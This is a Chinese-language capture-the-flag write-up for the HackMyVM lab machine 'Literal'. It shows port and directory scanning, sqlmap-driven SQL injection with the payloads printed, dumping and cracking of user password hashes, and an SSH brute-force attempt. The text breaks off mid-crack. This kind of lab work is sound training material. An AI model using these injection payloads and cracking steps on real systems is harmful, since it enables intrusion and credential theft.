---
title: HMV-Literal
description: 'Try it with OSCP style. Thanks for play (:'
pubDate: 2026-01-15
image: /mechine/Literal.jpg
categories:
  - Documentation
tags:
  - Hackmyvm
  - Linux
---

![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768471396797-dd2964e0-d4aa-4883-bb76-6417b0cd0ffd.png)

# 信息收集
## ip定位
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# arp-scan -l | grep "08:00:27"
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
192.168.0.101   08:00:27:4c:64:e1       (Unknown)
```

## nmap扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# nmap -Pn -sTCV -T4 -p0-65535 192.168.0.101  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-15 05:12 EST
Nmap scan report for agencyperfect.com (192.168.0.101)
Host is up (0.00027s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 30:ca:55:94:68:33:8b:50:42:f4:c2:b5:13:99:66:fe (RSA)
|   256 2d:b0:5e:6b:96:bd:0b:e3:14:fb:e0:d0:58:84:50:85 (ECDSA)
|_  256 92:d9:2a:5d:6f:58:db:85:56:d6:0c:99:68:b8:59:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://blog.literal.hmv
Service Info: Host: blog.literal.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.40 seconds
```



## 80端口
发现ip重定向至blog.literal.hmv   |  添加hosts

### 目录扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# dirsearch -u blog.literal.hmv   
/root/.pyenv/versions/3.11.9/envs/web/lib/python3.11/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1   
 (_||| _) (/_(_|| (_| )                  
                                         
Extensions: php, aspx, jsp, html, js
HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/reports/_blog.literal.hmv/_26-01-15_05-22-56.txt

Target: http://blog.literal.hmv/

[05:22:56] Starting:                     
[05:22:58] 403 -  281B  - /.htaccess.bak1
[05:22:58] 403 -  281B  - /.htaccessBAK
[05:22:58] 403 -  281B  - /.htaccess.save
[05:22:58] 403 -  281B  - /.htaccess.sample                                       
[05:22:59] 403 -  281B  - /.htaccess_extra                                        
[05:22:58] 403 -  281B  - /.ht_wsr.txt
[05:22:59] 403 -  281B  - /.htaccess_orig
[05:22:59] 403 -  281B  - /.htaccessOLD2
[05:22:59] 403 -  281B  - /.htm
[05:22:59] 403 -  281B  - /.html
[05:22:59] 403 -  281B  - /.htaccess_sc
[05:22:59] 403 -  281B  - /.htaccess.orig
[05:22:59] 403 -  281B  - /.htpasswd_test
[05:22:59] 403 -  281B  - /.htpasswds
[05:22:59] 403 -  281B  - /.htaccessOLD
[05:22:59] 403 -  281B  - /.httr-oauth
[05:23:00] 403 -  281B  - /.php
[05:23:21] 200 -    0B  - /config.php
[05:23:23] 302 -    0B  - /dashboard.php  ->  login.php
[05:23:29] 301 -  320B  - /fonts  ->  http://blog.literal.hmv/fonts/
[05:23:32] 301 -  321B  - /images  ->  http://blog.literal.hmv/images/
[05:23:32] 200 -  459B  - /images/
[05:23:37] 200 -  778B  - /login.php
[05:23:38] 302 -    0B  - /logout.php  ->  login.php
[05:23:52] 200 -  717B  - /register.php
[05:23:55] 403 -  281B  - /server-status/
[05:23:55] 403 -  281B  - /server-status

Task Completed 
```

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.0.101 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js,yaml -t 64 --exclude-length 310gobuster dir -u http://blog.literal.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js,yaml -t 64 
Error: error on parsing arguments: invalid value for exclude-length: invalid string given: 310gobuster
                                         
┌──(web)─(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://blog.literal.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js,yaml -t 64 --exclude-length 310 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blog.literal.hmv
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          310
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,js,yaml,php,txt,html,zip,db
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 281]
/.php                 (Status: 403) [Size: 281]
/index.html           (Status: 200) [Size: 3325]
/images               (Status: 301) [Size: 321] [--> http://blog.literal.hmv/images/]                                      
/register.php         (Status: 200) [Size: 2159]
/login.php            (Status: 200) [Size: 1893]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 320] [--> http://blog.literal.hmv/fonts/]                                       
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/.php                 (Status: 403) [Size: 281]
/.html                (Status: 403) [Size: 281]
/server-status        (Status: 403) [Size: 281]
Progress: 1985031 / 1985040 (100.00%)
===============================================================
Finished
===============================================================
                      
```

### /register
尝试注册admin失败

注册kali用户![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768473417738-a1bf85f0-9aae-4401-9d03-c45b13e6507a.png)

### /login
![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768473474062-f0c063ee-b288-4f66-ba1a-5cab298005f3.png)

> <font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">嗨呀，kali。这是我目前在做的一些项目，还有一些未来的想法。我把接下来要做的事儿都记在这儿了，搞不好都是些不值一提的玩意儿，或者说，是</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">烂到家</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">的东西 —— 好吧，反正就是不咋样的东西。不过呢，我是一个人单干，所以时间虽然宝贵，但也不算啥大问题，凡事慢慢来，稳着点就好。（顺便说一句，这个页面做得有点丑，我还在学习中呢）</font>
>
> **<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">看看我都在忙些什么项目</font>**
>
> **<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">退出登录</font>**
>

![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768473760756-461a73fd-eaf3-4763-8ce4-a57695a2193f.png)

```plain
POST /next_projects_to_do.php HTTP/1.1
Host: blog.literal.hmv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://blog.literal.hmv
Connection: keep-alive
Referer: http://blog.literal.hmv/next_projects_to_do.php
Cookie: PHPSESSID=l5gd282b80gmbbiggnqjcgfeuk
Upgrade-Insecure-Requests: 1
Priority: u=0, i 

sentence-query=123
```

 尝试进行`sqlmap`：  （慢如龟速，我直接拿wp的用了）

```plain
┌──(kali㉿kali)-[~/temp/literal]
└─$ sqlmap -u "http://blog.literal.hmv/next_projects_to_do.php" --data "sentence-query=1" --cookie="PHPSESSID=1q4tie68cpa1mue9af2ao65549" --batch --dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:04:49 /2025-06-08/

[12:04:49] [INFO] resuming back-end DBMS 'mysql' 
[12:04:49] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: sentence-query (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sentence-query=1' AND (SELECT 3428 FROM (SELECT(SLEEP(5)))hFKD) AND 'mdnY'='mdnY

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: sentence-query=1' UNION ALL SELECT NULL,CONCAT(0x717a6b7871,0x4b756f5a616d456b4c76596f48446652644149766b6d64745666776148746858744863505247566e,0x716b626a71),NULL,NULL,NULL-- -
---
[12:04:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[12:04:49] [INFO] fetching database names
available databases [4]:
[*] blog
[*] information_schema
[*] mysql
[*] performance_schema

[12:04:50] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/blog.literal.hmv'

┌──(kali㉿kali)-[~/temp/literal]
└─$ sqlmap -u "http://blog.literal.hmv/next_projects_to_do.php" --data "sentence-query=1" --cookie="PHPSESSID=1q4tie68cpa1mue9af2ao65549" --batch -D blog --tables
-----
Database: blog
[2 tables]
+----------+
| projects |
| users    |
+----------+

┌──(kali㉿kali)-[~/temp/literal]
└─$ sqlmap -u "http://blog.literal.hmv/next_projects_to_do.php" --data "sentence-query=1" --cookie="PHPSESSID=1q4tie68cpa1mue9af2ao65549" --batch -D blog -T users --dump

Database: blog
Table: users
[18 entries]
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| userid | username  | useremail                        | userpassword                                                 | usercreatedate      |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| 1      | test      | test@blog.literal.htb            | $2y$10$wWhvCz1pGsKm..jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma | 2023-04-07 17:21:47 |
| 2      | admin     | admin@blog.literal.htb           | $2y$10$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K | 2023-04-07 17:21:47 |
| 3      | carlos    | carlos@blog.literal.htb          | $2y$10$ikI1dN/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW | 2023-04-07 17:21:48 |
| 4      | freddy123 | freddy123@zeeli.moc              | $2y$10$yaf9nZ6UJkf8103R8rMdtOUC.vyZUek4vXVPas3CPOb4EK8I6eAUK | 2023-04-07 17:21:48 |
| 5      | jorg3_M   | jorg3_M@zeeli.moc                | $2y$10$lZ./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG | 2023-04-07 17:21:48 |
| 6      | aNdr3s1to | aNdr3s1to@puertonacional.ply     | $2y$10$F2Eh43xkXR/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm | 2023-04-07 17:21:48 |
| 7      | kitty     | kitty@estadodelarte.moc          | $2y$10$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW | 2023-04-07 17:21:48 |
| 8      | walter    | walter@forumtesting.literal.hmv  | $2y$10$er9GaSRv1AwIwu9O.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO | 2023-04-07 17:21:48 |
| 9      | estefy    | estefy@caselogic.moc             | $2y$10$hBB7HeTJYBAtdFn7Q4xzL.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa | 2023-04-07 17:21:48 |
| 10     | michael   | michael@without.you              | $2y$10$sCbKEWGgAUY6a2Y.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km | 2023-04-07 17:21:48 |
| 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv | $2y$10$7itXOzOkjrAKk7Mp.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO | 2023-04-07 17:21:48 |
| 12     | fel1x     | fel1x@without.you                | $2y$10$o06afYsuN8yk0yoA.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m | 2023-04-07 17:21:48 |
| 13     | kelsey    | kelsey@without.you               | $2y$10$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6. | 2023-04-07 17:21:48 |
| 14     | jtx       | jtx@tiempoaltiempo.hy            | $2y$10$jN5dt8syJ5cVrlpotOXibeNC/jvW0bn3z6FetbVU/CeFtKwhdhslC | 2023-04-07 17:21:48 |
| 15     | DRphil    | DRphil@alcaldia-tol.gob          | $2y$10$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC | 2023-04-07 17:21:48 |
| 16     | carm3N    | carm3N@estadodelarte.moc         | $2y$10$D7uF6dKbRfv8U/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW | 2023-04-07 17:21:48 |
| 17     | lanz      | lanz@literal.htb                 | $2y$10$PLGN5.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf..e | 2023-04-07 17:55:36 |
| 18     | kali      | kali@kali.com                    | $2y$10$zzhgE4mDcdEGhDR6VGwK9.qpCDLnDkFmVB6cSDo.bPNjKdUV.Hw1. | 2025-06-08 15:40:11 |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
```

![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768474255665-d9ccfbda-be0e-44df-8652-a45dd4f1d327.png)

```plain
test:$2y$10$wWhvCz1pGsKm..jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma
admin:$2y$10$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K
carols:$2y$10$ikI1dN/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW
freddy123:$2y$10$yaf9nZ6UJkf8103R8rMdtOUC.vyZUek4vXVPas3CPOb4EK8I6eAUK
jorg3_M:$2y$10$lZ./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG
aNdr3s1to:$2y$10$F2Eh43xkXR/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm
kitty:$2y$10$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW
walter:$2y$10$er9GaSRv1AwIwu9O.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO
estefy:$2y$10$hBB7HeTJYBAtdFn7Q4xzL.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa
michael:$2y$10$sCbKEWGgAUY6a2Y.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km
r1ch4rd:$2y$10$7itXOzOkjrAKk7Mp.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO
fel1x:$2y$10$o06afYsuN8yk0yoA.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m
kelsey:$2y$10$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6.
jtx:$2y$10$jN5dt8syJ5cVrlpotOXibeNC/jvW0bn3z6FetbVU/CeFtKwhdhslC
DRphil:$2y$10$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC
carm3N:$2y$10$D7uF6dKbRfv8U/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW
lanz:$2y$10$PLGN5.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf..e
kali:$2y$10$zzhgE4mDcdEGhDR6VGwK9.qpCDLnDkFmVB6cSDo.bPNjKdUV.Hw1.
```

 尝试进行破译：  

```plain
┌──(kali㉿kali)-[~/temp/literal]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 18 password hashes with 18 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456789        (freddy123)     
butterfly        (estefy)     
monica           (r1ch4rd)     
hellokitty       (kitty)     
50cent           (DRphil)     
slipknot         (jorg3_M)     
michael1         (michael)     
147258369        (fel1x)     
kelsey           (kelsey)     
741852963        (walter)
zxcvbnm,./       (jtx)
```

尝试爆破但是失败了：

```plain
┌──(kali㉿kali)-[~]
└─$ hydra -L user.txt -P pass.txt ssh://192.168.21.5   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-07 05:35:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:18/p:14), ~16 tries per task
[DATA] attacking ssh://192.168.21.5:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-07 05:36:54
```

 在邮箱中发现forumtesting.literal.hmv，在/etc/hosts中添加一下,访问

跳转至[http://forumtesting.literal.hmv/category.php](http://forumtesting.literal.hmv%E4%BC%9A%E8%B7%B3%E5%88%B0/category.php)

```plain
┌──(kali㉿kali)-[~]
└─$ curl http://forumtesting.literal.hmv/category.php
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<!-- jQuery -->
<title>c4TLoUis forum</title> 
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<link rel="stylesheet" href="css/style.css">
</head>
<body class="">
<div class="container" style="min-height:500px;">
        <div class="container">
        <div class="row">
                <h2>Discussion Forum | About... Imagination</h2>
                <h3><a href="category.php">Home</a> | <a href="login.php">Login</a> | <a href="cp_login.php">Control Panel</a></h3>


                                        <div class="single category">
                                <ul class="list-unstyled">
                                        <li><span style="font-size:25px;font-weight:bold;">Categories</span> <span class="pull-right"><span style="font-size:20px;font-weight:bold;">Topics / Posts</span></span></li>
                                                               <li><a href="category.php?category_id=2" title="">Forum details <span class="pull-right">0 / 0</span></a></li>
                                                               <li><a href="category.php?category_id=1" title="">New things for the blog <span class="pull-right">0 / 0</span></a></li>
                                                               </ul>
                   </div>
                </div>
</div>
<div class="insert-post-ads1" style="margin-top:20px;">

</body>
</html>
```

 发现了会跳转到category.php?category_id=2和category.php?category_id=1，尝试SQL注入  

```plain
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=1" --dbs
        ___
       __H__                                                    
 ___ ___[)]_____ ___ ___  {1.9.6#stable}                        
|_ -| . [(]     | .'| . |                                       
|___|_  [.]_|_|_|__,|  _|                                       
      |_|V...       |_|   https://sqlmap.org                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:07:25 /2025-09-07/

[05:07:25] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=i22h1s4iub5...odh6ljfn5r'). Do you want to use those [Y/n] y
[05:07:27] [INFO] checking if the target is protected by some kind of WAF/IPS
[05:07:27] [INFO] testing if the target URL content is stable
[05:07:27] [INFO] target URL content is stable
[05:07:27] [INFO] testing if GET parameter 'category_id' is dynamic
[05:07:27] [INFO] GET parameter 'category_id' appears to be dynamic
[05:07:27] [WARNING] heuristic (basic) test shows that GET parameter 'category_id' might not be injectable
[05:07:27] [INFO] testing for SQL injection on GET parameter 'category_id'                                                      
[05:07:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                    
[05:07:27] [WARNING] reflective value(s) found and filtering out
[05:07:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                            
[05:07:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'            
[05:07:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                 
[05:07:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                           
[05:07:28] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                           
[05:07:28] [INFO] testing 'Generic inline queries'
[05:07:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                                          
[05:07:28] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                               
[05:07:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                        
[05:07:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                  
[05:07:48] [INFO] GET parameter 'category_id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable     
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[05:07:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                        
[05:07:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:07:53] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:07:53] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
[05:07:55] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')                                                  
[05:07:55] [INFO] target URL appears to be UNION injectable with 1 columns
[05:07:55] [INFO] checking if the injection point on GET parameter 'category_id' is a false positive
GET parameter 'category_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
---
Parameter: category_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category_id=1 AND (SELECT 1383 FROM (SELECT(SLEEP(5)))xNgV)
---
[05:08:38] [INFO] the back-end DBMS is MySQL
[05:08:38] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[05:08:38] [INFO] fetching database names
[05:08:38] [INFO] fetching number of databases
[05:08:38] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[05:09:11] [INFO] adjusting time delay to 1 second due to good response times
3
[05:09:11] [INFO] retrieved: information_schema
[05:11:06] [INFO] retrieved: performance_schema
[05:12:57] [INFO] retrieved: forumtesting
available databases [3]:
[*] forumtesting
[*] information_schema
[*] performance_schema

[05:14:16] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 72 times
[05:14:16] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/forumtesting.literal.hmv'      

[*] ending @ 05:14:16 /2025-09-07/
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=1" -D forumtesting --tables
        ___
       __H__                                                    
 ___ ___[,]_____ ___ ___  {1.9.6#stable}                        
|_ -| . ["]     | .'| . |                                       
|___|_  [.]_|_|_|__,|  _|                                       
      |_|V...       |_|   https://sqlmap.org                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:20:33 /2025-09-07/

[05:20:33] [INFO] resuming back-end DBMS 'mysql' 
[05:20:33] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=1lqb93c1bl9...s3e3671pdm'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category_id=1 AND (SELECT 1383 FROM (SELECT(SLEEP(5)))xNgV)
---
[05:21:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0.12
[05:21:00] [INFO] fetching tables for database: 'forumtesting'
[05:21:00] [INFO] fetching number of tables for database 'forumtesting'                                                         
[05:21:00] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[05:21:39] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
5
[05:21:49] [INFO] retrieved: 
[05:21:59] [INFO] adjusting time delay to 1 second due to good response times
forum_category
[05:23:31] [INFO] retrieved: forum_owner
[05:24:19] [INFO] retrieved: forum_posts
[05:25:11] [INFO] retrieved: forum_topics
[05:26:06] [INFO] retrieved: forum_users
Database: forumtesting
[5 tables]
+----------------+
| forum_category |
| forum_owner    |
| forum_posts    |
| forum_topics   |
| forum_users    |
+----------------+

[05:26:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/forumtesting.literal.hmv'      

[*] ending @ 05:26:48 /2025-09-07/
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=1" -D forumtesting -T forum_owner --dump
        ___
       __H__                                                    
 ___ ___[(]_____ ___ ___  {1.9.6#stable}                        
|_ -| . ["]     | .'| . |                                       
|___|_  [(]_|_|_|__,|  _|                                       
      |_|V...       |_|   https://sqlmap.org                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:14:15 /2025-09-07/

[06:14:15] [INFO] resuming back-end DBMS 'mysql' 
[06:14:15] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=v5p5ga41ijk...tke50atlns'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category_id=1 AND (SELECT 1383 FROM (SELECT(SLEEP(5)))xNgV)
---
[06:14:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0.12
[06:14:16] [INFO] fetching columns for table 'forum_owner' in database 'forumtesting'
[06:14:16] [INFO] resumed: 5
[06:14:16] [INFO] resumed: created
[06:14:16] [INFO] resumed: email
[06:14:16] [INFO] resumed: id
[06:14:16] [INFO] resumed: password
[06:14:16] [INFO] resumed: username
[06:14:16] [INFO] fetching entries for table 'forum_owner' in database 'forumtesting'
[06:14:16] [INFO] fetching number of entries for table 'forum_owner' in database 'forumtesting'                                 
[06:14:16] [INFO] resumed: 1
[06:14:16] [INFO] resumed: 2022-02-12
[06:14:16] [INFO] resumed: carlos@forumtesting.literal.htb
[06:14:16] [INFO] resumed: 1
[06:14:16] [INFO] resumed: 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99
[06:14:16] [INFO] resumed: carlos
[06:14:16] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[06:14:17] [INFO] writing hashes to a temporary file '/tmp/sqlmaphevyecj1170215/sqlmaphashes-elmqvfdz.txt'                      
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[06:14:18] [INFO] using hash method 'sha512_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
